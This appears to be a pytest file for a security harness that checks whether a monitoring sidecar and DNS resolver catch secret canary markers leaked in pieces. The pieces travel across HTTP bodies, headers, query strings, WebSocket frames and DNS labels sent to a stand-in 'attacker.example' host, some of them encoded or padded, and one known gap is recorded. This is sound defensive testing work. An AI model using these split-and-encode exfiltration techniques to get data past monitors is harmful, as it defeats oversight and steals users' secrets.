"""§10.4.2 — a canary split across several requests or DNS queries is reassembled and found.

``scan_for_canaries`` scans one string at a time, so a skill that sends a planted marker in
pieces shorter than the 12-character window — one piece per POST, one per DNS lookup — left no
single string with anything to find. STATUS listed it as an open residual. These tests sit at
the wiring, not the helper: the sidecar's mitmproxy-facing ``_RecordingAddon`` built by
``build_addon`` from a ``SidecarConfig`` (the path a live request takes), the flow log the host
reads back, the Plane C action and the evidence index that turns it into the canary gate's
input; and, for DNS, the resolver's own ``record`` → query log → ``dns_actions`` → Plane C.

Every positive case first asserts that the per-request scan finds **nothing** in any single
request — otherwise the test would pass on the old code and prove nothing.
"""

from __future__ import annotations

import base64
import json
from pathlib import Path

import pytest

from bellwether.assertions import EvidenceIndex
from bellwether.capture import SidecarConfig, build_addon, mint_canaries
from bellwether.capture.canary import Canary, scan_for_canaries
from bellwether.capture.canary_stream import STREAM_TAIL_CHARS, CanaryReassembler
from bellwether.capture.dns import DnsAllowlist, read_query_records, scan_query_for_canaries
from bellwether.capture.egress import EgressFlow
from bellwether.capture.proxy_addon import (
    flow_record_line,
    parse_flow_record,
    read_flow_records,
)
from bellwether.capture.resolver_entry import _RecordingResolver
from bellwether.capture.sidecar_entry import _RecordingAddon
from bellwether.trace import (
    Trace,
    canary_actions,
    dns_actions,
    dns_reassembly_actions,
    egress_actions,
    egress_body_actions,
)
from bellwether.trace.canonical import NormalizationContext
from bellwether.trace.models import Coverage, PlaneCoverage
from tests.factories import make_footer, make_header
from tests.test_sidecar_entry import (
    _HOST_ENVIRON,
    _MODEL_BODY,
    _SHAPES,
    _TS,
    _FakeRequest,
    _HookFlow,
    _host_broker,
)

#: A 30-character marker: in thirds, each piece is 10 characters — under the 12-character window,
#: so no single request carries anything the per-request scan can find.
_SHORT = Canary(id="c9", marker="Qm7XkR2pLw9TzB4nVc8HsJ3yFd6GaE", kind="", path="")
_CANARIES = (*mint_canaries(7), _SHORT)


def _recording(
    tmp_path: Path, canaries: tuple[Canary, ...] = _CANARIES
) -> tuple[_RecordingAddon, Path]:
    flow_log = tmp_path / "flows.jsonl"
    config = SidecarConfig(
        provider_endpoints=("api.anthropic.com",),
        infrastructure_endpoints=("telemetry.example-harness.com",),
        allowlist_extra=("collector.example", "other.example"),
        provider_of_host={"api.anthropic.com": "anthropic"},
        credential_export=_host_broker().sidecar_export(),
        max_requests=1000,
        max_request_bytes=100_000_000,
        flow_log_path=str(flow_log),
        provider_shapes=_SHAPES,
        canary_markers=tuple((c.id, c.marker) for c in canaries),
    )
    addon = build_addon(config, _HOST_ENVIRON, clock=lambda: _TS)
    renderer = lambda block: ("rendered", block.status)  # noqa: E731
    return _RecordingAddon(addon, str(flow_log), render=renderer), flow_log


def _send(recording: _RecordingAddon, request: _FakeRequest) -> None:
    recording.request(_HookFlow(request=request))  # type: ignore[arg-type]


def _post(
    body: str, *, host: str = "collector.example", path: str = "/ingest", **headers: str
) -> _FakeRequest:
    return _FakeRequest(host=host, path=path, content=body.encode(), headers=dict(headers))


def _thirds(text: str) -> list[str]:
    step = -(-len(text) // 3)
    return [text[i : i + step] for i in range(0, len(text), step)]


def _alone_is_clean(pieces: list[str]) -> None:
    """The precondition that makes a positive case mean something: no piece, scanned on its own
    by the per-request scan, carries the canary."""
    for piece in pieces:
        assert scan_for_canaries(piece, _CANARIES, destination="other_host") == []


def _reassembled(flows: list[EgressFlow]) -> list[tuple[int, str, str, int]]:
    return [
        (index, hit.canary_id, hit.via, hit.length)
        for index, flow in enumerate(flows)
        for hit in flow.canary_hits
        if hit.via.startswith("reassembled:")
    ]


# ---------------------------------------------------------------------------
# The sidecar: a split across request bodies
# ---------------------------------------------------------------------------


def test_a_marker_in_thirds_across_three_posts_is_found(tmp_path: Path) -> None:
    pieces = _thirds(_SHORT.marker)
    _alone_is_clean(pieces)
    recording, flow_log = _recording(tmp_path)
    for piece in pieces:
        _send(recording, _post(piece))

    flows = read_flow_records(flow_log)  # through the wire the host reads
    found = _reassembled(flows)
    # Two thirds already make a 20-character window; the third completes the marker. Both are
    # anchored to the request that completed them, and neither to the first.
    assert found == [(1, "c9", "reassembled:windowed", 20), (2, "c9", "reassembled:exact", 30)]
    assert all(
        hit.offset == -1 and hit.destination == "other_host" for f in flows for hit in f.canary_hits
    )
    assert flows[2].canary_hits[0].channel == "reassembled:body@destination"


def test_the_whole_base64_encoding_split_in_thirds_is_decoded_once_reassembled(
    tmp_path: Path,
) -> None:
    """Encode the marker, then split the encoding: each third decodes to under 12 bytes on its
    own, and only the concatenation decodes to the marker (§10.4.2: decode *after* joining)."""
    encoded = base64.b64encode(_SHORT.marker.encode()).decode()
    pieces = _thirds(encoded)
    _alone_is_clean(pieces)
    recording, flow_log = _recording(tmp_path)
    for piece in pieces:
        _send(recording, _post(piece))

    found = _reassembled(read_flow_records(flow_log))
    assert (2, "c9", "reassembled:decoded", 30) in found


def test_a_minted_marker_in_framed_json_pieces_is_found(tmp_path: Path) -> None:
    """The realistic shape: a real 40-character marker, four 10-character pieces, each wrapped
    in a JSON body. The frame the bodies share is stripped; the pieces are joined."""
    marker = _CANARIES[0].marker
    pieces = [marker[i : i + 10] for i in range(0, 40, 10)]
    _alone_is_clean(pieces)
    recording, flow_log = _recording(tmp_path)
    for index, piece in enumerate(pieces):
        _send(recording, _post(f'{{"event": "sync", "d": "{piece}"}}'))
        assert scan_for_canaries(f'{{"d": "{piece}"}}', _CANARIES, destination="other_host") == []
        del index

    found = _reassembled(read_flow_records(flow_log))
    assert found[-1] == (3, "c1", "reassembled:exact", 40)


def test_a_split_through_the_query_string_is_found(tmp_path: Path) -> None:
    recording, flow_log = _recording(tmp_path)
    for piece in _thirds(_SHORT.marker):
        _send(
            recording,
            _FakeRequest(method="GET", host="collector.example", path=f"/p?d={piece}", content=b""),
        )
    found = _reassembled(read_flow_records(flow_log))
    assert found[-1] == (2, "c9", "reassembled:exact", 30)


def test_a_split_through_a_header_is_found(tmp_path: Path) -> None:
    """A header never reaches the record unredacted, so it can only be reassembled here."""
    recording, flow_log = _recording(tmp_path)
    for piece in _thirds(_SHORT.marker):
        _send(recording, _post("{}", **{"X-Trace": f"t-{piece}"}))
    flows = read_flow_records(flow_log)
    assert _reassembled(flows)[-1] == (2, "c9", "reassembled:exact", 30)
    assert flows[2].canary_hits[-1].channel == "reassembled:header:x-trace@destination"


def test_a_split_interleaved_with_other_hosts_traffic_is_found_on_its_hosts_stream(
    tmp_path: Path,
) -> None:
    recording, flow_log = _recording(tmp_path)
    for piece in _thirds(_SHORT.marker):
        _send(recording, _post(piece))
        _send(recording, _post('{"status": "ok", "id": 42}', host="other.example"))
    found = _reassembled(read_flow_records(flow_log))
    assert found[-1] == (4, "c9", "reassembled:exact", 30)


def test_a_split_across_two_hosts_is_found_on_the_overall_stream(tmp_path: Path) -> None:
    recording, flow_log = _recording(tmp_path)
    first, second, third = _thirds(_SHORT.marker)
    _send(recording, _post(first, host="collector.example"))
    _send(recording, _post(second, host="other.example"))
    _send(recording, _post(third, host="collector.example"))
    flows = read_flow_records(flow_log)
    assert _reassembled(flows)[-1] == (2, "c9", "reassembled:exact", 30)
    assert flows[2].canary_hits[-1].channel == "reassembled:body@all"


def test_a_split_across_websocket_frames_is_found(tmp_path: Path) -> None:
    """Frames after a permitted upgrade go through the same per-frame decision as a request
    body, so a marker streamed a third per frame is reassembled on the socket's body stream."""
    from tests.test_websocket_egress import _Frame, _WsFlow

    recording, flow_log = _recording(tmp_path)
    flow = _WsFlow(
        request=_FakeRequest(method="GET", host="collector.example", path="/stream", content=b"")
    )
    for piece in _thirds(_SHORT.marker):
        flow.websocket.messages.append(_Frame(from_client=True, content=piece.encode()))
        recording.websocket_message(flow)
    flows = read_flow_records(flow_log)
    assert [flow.method for flow in flows] == ["WEBSOCKET"] * 3
    assert _reassembled(flows)[-1] == (2, "c9", "reassembled:exact", 30)


_PIECE_ENCODINGS = {
    "hex": lambda piece: piece.encode().hex(),
    "percent-escaped": lambda piece: "".join(f"%{byte:02X}" for byte in piece.encode()),
    "html-entities": lambda piece: "".join(f"&#{byte};" for byte in piece.encode()),
    # base64 concatenates only on its 3-byte block boundary: 9-byte pieces do.
    "base64 on block boundaries": lambda piece: base64.b64encode(piece.encode()).decode(),
}


@pytest.mark.parametrize("encoding", sorted(_PIECE_ENCODINGS))
def test_independently_encoded_pieces_are_found_where_the_encoding_concatenates(
    tmp_path: Path, encoding: str
) -> None:
    """The ``encoded-chunked-thief`` shape — each piece encoded on its own *after* the split —
    is found wherever encoding the pieces and joining them is the encoding of the join."""
    encode = _PIECE_ENCODINGS[encoding]
    marker = _SHORT.marker
    pieces = [encode(marker[at : at + 9]) for at in range(0, len(marker), 9)]  # 9/9/9/3
    _alone_is_clean(pieces)
    recording, flow_log = _recording(tmp_path)
    for piece in pieces:
        _send(recording, _post(piece))
    found = _reassembled(read_flow_records(flow_log))
    assert found and found[-1][1:] in {
        ("c9", "reassembled:decoded", 30),
        ("c9", "reassembled:exact", 30),
    }


@pytest.mark.xfail(
    strict=True,
    reason="§10.4.2 stated limit: independently base64-encoded pieces off the 3-byte block "
    "boundary do not concatenate into the encoding of the marker",
)
def test_independently_base64_encoded_pieces_off_the_block_boundary(tmp_path: Path) -> None:
    pieces = [base64.b64encode(part.encode()).decode() for part in _thirds(_SHORT.marker)]
    recording, flow_log = _recording(tmp_path)
    for piece in pieces:
        _send(recording, _post(piece))
    assert _reassembled(read_flow_records(flow_log))


def test_a_split_reaches_the_canary_gate_as_a_leak(tmp_path: Path) -> None:
    """The last hops: the flow log → Plane D → Plane C ``canary_leak`` → the evidence index the
    canary gate reads. A reassembled hit is a critical leak like any other body hit."""
    recording, flow_log = _recording(tmp_path)
    for piece in _thirds(_SHORT.marker):
        _send(recording, _post(piece))
    flows = read_flow_records(flow_log)
    plane_d = egress_actions(flows)
    plane_c = egress_body_actions(
        list(zip(plane_d, (flow.canary_hits for flow in flows), strict=True)),
        start_seq=len(plane_d),
    )
    assert {(a.kind, a.action["severity"], a.correlation.anchor_seq) for a in plane_c} == {  # type: ignore[union-attr]
        ("canary_leak", "critical", 1),
        ("canary_leak", "critical", 2),
    }
    header = make_header(
        coverage=Coverage(
            harness_events=PlaneCoverage(fidelity="full"),
            egress=PlaneCoverage(fidelity="full"),
            credentials=PlaneCoverage(fidelity="full"),
        )
    )
    trace = Trace(header=header, actions=tuple(plane_d + plane_c), footer=make_footer())
    assert EvidenceIndex.from_trace(trace, NormalizationContext("/work/x")).canary_leak_present


# ---------------------------------------------------------------------------
# The sidecar: no false positive, no double report
# ---------------------------------------------------------------------------


def test_benign_traffic_produces_no_reassembled_hit(tmp_path: Path) -> None:
    """Ordinary chatter — JSON telemetry with changing ids and counters, paths, headers — over
    many requests, to several hosts: nothing reassembles into a marker."""
    recording, flow_log = _recording(tmp_path)
    for index in range(60):
        _send(
            recording,
            _post(
                f'{{"event": "tick", "seq": {index}, "session": "s-{index * 7919 % 10007:05d}", '
                f'"payload": "{"ab" * (index % 9)}"}}',
                host=("collector.example", "other.example")[index % 2],
                path=f"/v1/events/{index}",
                **{"User-Agent": "skill/1.0", "X-Request-Id": f"req-{index:04d}"},
            ),
        )
    flows = read_flow_records(flow_log)
    assert all(flow.canary_hits == () for flow in flows)
    assert all(flow.canary_reassembly_limit == "" for flow in flows)


def test_a_legitimately_read_canary_sent_to_the_model_in_pieces_is_not_a_leak(
    tmp_path: Path,
) -> None:
    """The §10.4.1 false-positive guard: a value that went into the model's context rides in
    every later model request. Model-API requests are graded host-side by read state, so the
    reassembly leaves them out exactly as the per-request scan here does."""
    recording, flow_log = _recording(tmp_path)
    for piece in _thirds(_SHORT.marker):
        body = json.dumps({**json.loads(_MODEL_BODY), "system": piece}).encode()
        _send(recording, _FakeRequest(path="/v1/messages", content=body))
    flows = read_flow_records(flow_log)
    assert [(flow.egress_class, flow.blocked) for flow in flows] == [("model_api", False)] * 3
    assert all(flow.canary_hits == () for flow in flows)


def test_a_marker_whole_in_one_request_is_reported_once_not_again_as_a_split(
    tmp_path: Path,
) -> None:
    recording, flow_log = _recording(tmp_path)
    _send(recording, _post("warmup"))
    _send(recording, _post(f"x={_SHORT.marker}"))
    _send(recording, _post("cooldown"))
    flows = read_flow_records(flow_log)
    assert [(hit.canary_id, hit.via) for hit in flows[1].canary_hits] == [("c9", "exact")]
    assert _reassembled(flows) == []


def test_a_split_the_completing_request_already_carries_is_not_reported_twice(
    tmp_path: Path,
) -> None:
    """The completing request holds the last two thirds — a 20-character window its own scan
    finds. The joined stream holds the whole marker, but that is the same leak on the same
    request, so it is recorded once, by the per-request scan."""
    first = _SHORT.marker[:10]
    rest = _SHORT.marker[10:]
    recording, flow_log = _recording(tmp_path)
    _send(recording, _post(first))
    _send(recording, _post(rest))
    flows = read_flow_records(flow_log)
    assert [(hit.canary_id, hit.via, hit.length) for hit in flows[1].canary_hits] == [
        ("c9", "windowed", 20)
    ]


def test_a_marker_already_sent_whole_is_not_pinned_on_the_next_innocent_request(
    tmp_path: Path,
) -> None:
    """A marker sent whole in one header sits in that header's stream afterwards. The next
    request's value joined to it still holds the marker — but entirely on the earlier side, so it
    is no split, and the innocent request that followed must not be anchored a leak."""
    recording, flow_log = _recording(tmp_path)
    _send(recording, _post("{}", **{"X-Trace": f"t-{_SHORT.marker}"}))
    _send(recording, _post("{}", **{"X-Trace": "t-benign"}))
    flows = read_flow_records(flow_log)
    assert [hit.canary_id for hit in flows[0].canary_hits] == ["c9"]
    assert flows[1].canary_hits == ()


def test_the_flow_log_is_byte_identical_across_two_runs(tmp_path: Path) -> None:
    logs = []
    for name in ("a", "b"):
        (tmp_path / name).mkdir()
        recording, flow_log = _recording(tmp_path / name)
        for piece in _thirds(_SHORT.marker):
            _send(recording, _post(piece, **{"X-B": "1", "X-A": piece}))
        logs.append(flow_log.read_bytes())
    assert logs[0] == logs[1]


# ---------------------------------------------------------------------------
# The bounds
# ---------------------------------------------------------------------------


def test_memory_is_bounded_however_much_a_request_streams() -> None:
    reassembler = CanaryReassembler(_CANARIES, destination="other_host")
    for size in (5_000_000, 3_000_000, 4_000_000):
        reassembler.feed("collector.example", [("body", "z" * (size - 1) + "q", False)])
    for stream in reassembler._streams.values():
        assert len(stream.tail) <= STREAM_TAIL_CHARS
        assert len(stream.prev_head) <= STREAM_TAIL_CHARS
        assert len(stream.prev_tail) <= STREAM_TAIL_CHARS


def test_only_a_values_ends_are_ever_decoded(monkeypatch: pytest.MonkeyPatch) -> None:
    """A stream joins only a value's ends, so only they are unescaped: a skill streaming a
    gigabyte must not make the reassembly copy and decode the gigabyte a second time."""
    from bellwether.capture import canary_stream

    seen: list[int] = []
    real = canary_stream._unescape

    def spy(value: str) -> str:
        seen.append(len(value))
        return real(value)

    monkeypatch.setattr(canary_stream, "_unescape", spy)
    reassembler = CanaryReassembler(_CANARIES, destination="other_host")
    reassembler.feed("h", [("body", "%41" * 2_000_000, False)])
    assert seen and max(seen) <= 4 * STREAM_TAIL_CHARS


def test_a_split_after_megabytes_of_padding_is_still_found() -> None:
    """Only the ends of a value join the stream, so padding in front of a piece is free to send
    and changes nothing: the piece at the end of one body still meets the next body's start."""
    reassembler = CanaryReassembler(_CANARIES, destination="other_host")
    first, second, third = _thirds(_SHORT.marker)
    reassembler.feed("h", [("body", "p" * 3_000_000 + first, False)])
    reassembler.feed("h", [("body", second, False)])
    hits, _ = reassembler.feed("h", [("body", third + "s" * 3_000_000, False)])
    assert [(hit.canary_id, hit.length) for hit in hits] == [("c9", 30)]


def test_the_stream_bound_folds_and_is_recorded_on_the_flow(tmp_path: Path) -> None:
    """Past the stream bound a new view is folded into one shared stream — still scanned — and
    the flow says so, so the run's credentials coverage reads ``partial``, never ``full``."""
    recording, flow_log = _recording(tmp_path)
    recording._addon._reassembler._max_streams = 4
    for piece in _thirds(_SHORT.marker):
        _send(recording, _post(piece, **{f"X-{piece}": "v"}))
    flows = read_flow_records(flow_log)
    assert all(
        "reached its bound of 4 streams" in flow.canary_reassembly_limit for flow in flows[1:]
    )
    # The limit survives the wire and lands on the Plane D record.
    assert parse_flow_record(flow_record_line(flows[-1])) == flows[-1]
    assert "canary_reassembly_limit" in egress_actions(flows)[-1].action


# ---------------------------------------------------------------------------
# DNS, through the resolver's own recording path
# ---------------------------------------------------------------------------


def _resolved(tmp_path: Path, names: list[str]) -> list:  # type: ignore[type-arg]
    log = tmp_path / "queries.jsonl"
    resolver = _RecordingResolver(
        DnsAllowlist(frozenset({"api.anthropic.com"})), str(log), clock=lambda: _TS
    )
    for name in names:
        resolver.record(name)
    return dns_actions(read_query_records(log))


@pytest.mark.parametrize("encode", ["plain", "base32"])
def test_a_marker_split_one_label_per_query_is_found(tmp_path: Path, encode: str) -> None:
    payload = (
        _SHORT.marker
        if encode == "plain"
        else base64.b32encode(_SHORT.marker.encode()).decode().rstrip("=").lower()
    )
    pieces = [payload[i : i + 10] for i in range(0, len(payload), 10)]
    names = [f"{piece}.attacker.example" for piece in pieces]
    for name in names:
        assert scan_query_for_canaries(name, _CANARIES) == []  # no single query carries it
    plane_e = _resolved(tmp_path, names)

    per_query = canary_actions(plane_e, _CANARIES)
    split, limit = dns_reassembly_actions(plane_e, _CANARIES, start_seq=len(plane_e))
    assert per_query == []
    assert limit == ""
    last = split[-1]
    assert (last.kind, last.action["canary_id"], last.action["severity"]) == (
        "canary_leak",
        "c9",
        "critical",
    )
    assert last.action["destination"] == "dns"
    assert last.correlation is not None and last.correlation.anchor_seq == plane_e[-1].seq


def test_a_dns_split_interleaved_with_ordinary_lookups_is_found(tmp_path: Path) -> None:
    names: list[str] = []
    for piece in _thirds(_SHORT.marker):
        names += [f"{piece}.x.attacker.example", "api.anthropic.com", "pypi.org"]
    split, _ = dns_reassembly_actions(_resolved(tmp_path, names), _CANARIES)
    assert split and split[-1].action["length"] == 30


def test_ordinary_lookups_reassemble_into_nothing(tmp_path: Path) -> None:
    names = [
        name
        for index in range(30)
        for name in (
            "api.anthropic.com",
            f"shard-{index:03d}.cdn.example.net",
            "statsig.anthropic.com",
            f"{index}.pool.ntp.org",
        )
    ]
    split, limit = dns_reassembly_actions(_resolved(tmp_path, names), _CANARIES)
    assert (split, limit) == ([], "")


def test_a_dns_marker_whole_in_one_query_is_not_reported_again(tmp_path: Path) -> None:
    names = [
        "a.attacker.example",
        f"{_SHORT.marker.lower()}.attacker.example",
        "b.attacker.example",
    ]
    plane_e = _resolved(tmp_path, names)
    assert [a.action["canary_id"] for a in canary_actions(plane_e, _CANARIES)] == ["c9"]
    assert dns_reassembly_actions(plane_e, _CANARIES)[0] == []


# ---------------------------------------------------------------------------
# The executor
# ---------------------------------------------------------------------------


def test_the_executor_reassembles_dns_and_degrades_coverage_at_the_bound() -> None:
    """Pinned on the source, as the provider-endpoint wiring is: the executor needs a Docker
    daemon. The producers it calls are each proven above; this pins that it calls them before
    the header (and its coverage block) is built, and that a reached bound reaches coverage."""
    source = (
        Path(__file__).resolve().parents[1] / "src" / "bellwether" / "cli" / "execution.py"
    ).read_text(encoding="utf-8")
    split = source.index("dns_reassembly_actions(")
    limit = source.index("if flow.canary_reassembly_limit")
    coverage = source.index('PlaneStatus(fidelity="partial", reason=reassembly_limit)')
    header = source.index("header = RunHeader(")
    assert split < limit < header < coverage
    assert source.index("plane_c += dns_split") < header
